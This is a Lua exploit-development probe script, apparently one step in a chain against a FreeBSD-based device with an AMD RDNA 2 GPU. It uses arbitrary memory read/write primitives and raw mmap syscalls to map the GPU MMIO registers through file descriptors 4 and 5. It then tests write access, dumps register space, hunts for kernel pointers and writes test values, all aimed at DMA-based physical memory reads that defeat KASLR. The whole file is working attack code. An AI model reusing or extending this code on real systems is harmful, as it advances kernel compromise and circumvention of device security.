-- CRASH_CLASS: MODERATE
-- PROBE 116a: GPU register mapping deep analysis
--
-- fd 4 and fd 5 map to GPU MMIO registers (first dword = 0xC0012800).
-- This is AMD RDNA 2 GPU hardware register space.
--
-- If we can WRITE to these registers, we can program the SDMA engine
-- to DMA from arbitrary physical memory → KASLR defeat via physical read.
--
-- Tests:
-- A: mmap fd 4 with PROT_RW (can we write?)
-- B: Dump first 4KB of fd 4 mapping (register layout)
-- C: mmap fd 5 with PROT_RW
-- D: Dump first 4KB of fd 5 mapping
-- E: Try mmap with different offsets (page through register space)
-- F: Look for SDMA/CP register signatures

print("=== PROBE 116a: GPU REGISTER MAP ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local pid=N(native.fcall_with_rax(syscall.pipe.fn_addr,20))
print("pid="..pid)

local sc_mmap = mk(477)

-- Helper: try mmap with different flags
local function try_mmap(fd, size, prot, flags, offset)
    local ok, addr = pcall(function()
        return sc_mmap(uint64(0), uint64(size), uint64(prot),
            uint64(flags), uint64(fd), uint64(offset or 0))
    end)
    if not ok then return nil end
    if not addr then return nil end
    local h, l = get_hi_lo(addr)
    if h<0 then h=h+0x100000000 end
    if h==0xFFFFFFFF and l==0xFFFFFFFF then return nil end
    return addr
end

-- Helper: dump memory region
local function dump_region(base, size, label)
    local MA = N(base)
    local non_zero = 0
    local kptrs = 0
    local readable = 0

    for off=0,size-4,4 do
        local ok, val = pcall(function() return memory.read_dword(MA+off) end)
        if ok then
            readable = readable + 1
            local v = N(val)
            if v ~= 0 then non_zero = non_zero + 1 end
        else
            break
        end
    end

    -- Print non-zero dwords
    local printed = 0
    for off=0,size-4,4 do
        local ok, val = pcall(function() return memory.read_dword(MA+off) end)
        if not ok then break end
        local v = N(val)
        if v ~= 0 then
            if v<0 then v=v+0x100000000 end
            print(string.format("  %s+0x%04X: 0x%08X", label, off, v))
            printed = printed + 1

            -- Check qword for kernel pointer
            if off % 8 == 0 then
                local qv = rq(MA+off)
                if is_kptr(qv) then
                    kptrs = kptrs + 1
                    print(string.format("    *** KERNEL POINTER: %s ***", fmt_ptr(qv)))
                end
            end

            if printed >= 100 then
                print(string.format("  ... (%d non-zero dwords total)", non_zero))
                break
            end
        end
    end

    print(string.format("  %s: %d readable, %d non-zero, %d kernel ptrs",
        label, readable, non_zero, kptrs))
    return readable, non_zero, kptrs
end

-- ============================================================
print("")
print("--- A: MMAP fd 4 PROT_RW (write access test) ---")

-- First try PROT_READ (already worked in 115a)
local fd4_r = try_mmap(4, 0x4000, 1, 1)  -- PROT_READ, MAP_SHARED
if fd4_r then
    print(string.format("  fd 4 PROT_R:  %s", fmt_ptr(fd4_r)))
end

-- Try PROT_RW
local fd4_rw = try_mmap(4, 0x4000, 3, 1)  -- PROT_RW, MAP_SHARED
if fd4_rw then
    print(string.format("  fd 4 PROT_RW: %s *** WRITABLE! ***", fmt_ptr(fd4_rw)))
else
    print("  fd 4 PROT_RW: MAP_FAILED")
    -- Try MAP_PRIVATE with RW
    fd4_rw = try_mmap(4, 0x4000, 3, 2)
    if fd4_rw then
        print(string.format("  fd 4 PROT_RW MAP_PRIVATE: %s", fmt_ptr(fd4_rw)))
    else
        print("  fd 4 PROT_RW MAP_PRIVATE: MAP_FAILED")
    end
end

-- ============================================================
print("")
print("--- B: DUMP fd 4 mapping (first 4KB) ---")
local fd4_map = fd4_r or fd4_rw
if fd4_map then
    dump_region(fd4_map, 0x1000, "fd4")
else
    print("  no mapping available")
end

-- ============================================================
print("")
print("--- C: MMAP fd 5 PROT_RW ---")
local fd5_r = try_mmap(5, 0x4000, 1, 1)
if fd5_r then
    print(string.format("  fd 5 PROT_R:  %s", fmt_ptr(fd5_r)))
end
local fd5_rw = try_mmap(5, 0x4000, 3, 1)
if fd5_rw then
    print(string.format("  fd 5 PROT_RW: %s *** WRITABLE! ***", fmt_ptr(fd5_rw)))
else
    print("  fd 5 PROT_RW: MAP_FAILED")
end

-- ============================================================
print("")
print("--- D: DUMP fd 5 mapping (first 4KB) ---")
local fd5_map = fd5_r or fd5_rw
if fd5_map then
    dump_region(fd5_map, 0x1000, "fd5")
else
    print("  no mapping available")
end

-- ============================================================
print("")
print("--- E: LARGER MMAP + OFFSETS ---")
-- Try mapping more of the register space
for _, sz in ipairs({0x10000, 0x100000, 0x1000000}) do
    local m = try_mmap(4, sz, 1, 1)
    if m then
        print(string.format("  fd 4 size=0x%X: %s", sz, fmt_ptr(m)))
    else
        print(string.format("  fd 4 size=0x%X: FAILED", sz))
    end
end

-- Try with offset
for _, off in ipairs({0x4000, 0x10000, 0x100000}) do
    local m = try_mmap(4, 0x4000, 1, 1, off)
    if m then
        print(string.format("  fd 4 offset=0x%X: %s first=0x%X", off, fmt_ptr(m),
            rd(N(m)) or 0))
    else
        print(string.format("  fd 4 offset=0x%X: FAILED", off))
    end
end

-- ============================================================
print("")
print("--- F: COMPARE fd 4 vs fd 5 ---")
if fd4_map and fd5_map then
    local same = 0
    local diff = 0
    local MA4 = N(fd4_map)
    local MA5 = N(fd5_map)
    for off=0,0xFC,4 do
        local v4 = rd(MA4+off) or 0
        local v5 = rd(MA5+off) or 0
        if v4==v5 then same=same+1
        else
            diff=diff+1
            if diff<=10 then
                if v4<0 then v4=v4+0x100000000 end
                if v5<0 then v5=v5+0x100000000 end
                print(string.format("  +0x%04X: fd4=0x%08X fd5=0x%08X", off, v4, v5))
            end
        end
    end
    print(string.format("  same=%d diff=%d", same, diff))
    if same==64 and diff==0 then
        print("  fd 4 and fd 5 are IDENTICAL mappings")
    end
end

-- ============================================================
print("")
print("--- G: WRITE TEST on fd 4 (if PROT_RW available) ---")
if fd4_rw then
    local MA = N(fd4_rw)
    -- Read current value at a safe offset (far from base)
    local test_off = 0x100
    local orig = rd(MA + test_off)
    print(string.format("  fd4+0x%X original: 0x%X", test_off, orig or 0))

    -- Try writing a known value
    local ok_w = pcall(function() memory.write_dword(MA + test_off, 0x41414141) end)
    local after = rd(MA + test_off)
    print(string.format("  write ok=%s, after: 0x%X", tostring(ok_w), after or 0))

    if after == 0x41414141 then
        print("  *** GPU REGISTER WRITE CONFIRMED! ***")
        -- Restore original
        pcall(function() memory.write_dword(MA + test_off, orig or 0) end)
        print("  restored original value")
    elseif ok_w then
        print("  write succeeded but value didn't stick (read-only register?)")
    else
        print("  write failed (pcall error)")
    end
else
    -- Try writing to PROT_READ mapping (should fail)
    if fd4_r then
        local MA = N(fd4_r)
        local ok_w = pcall(function() memory.write_dword(MA, 0x41414141) end)
        print(string.format("  write to PROT_R mapping: %s", ok_w and "SUCCEEDED?!" or "failed (expected)"))
    end
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(syscall.pipe.fn_addr,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 116a COMPLETE ===")
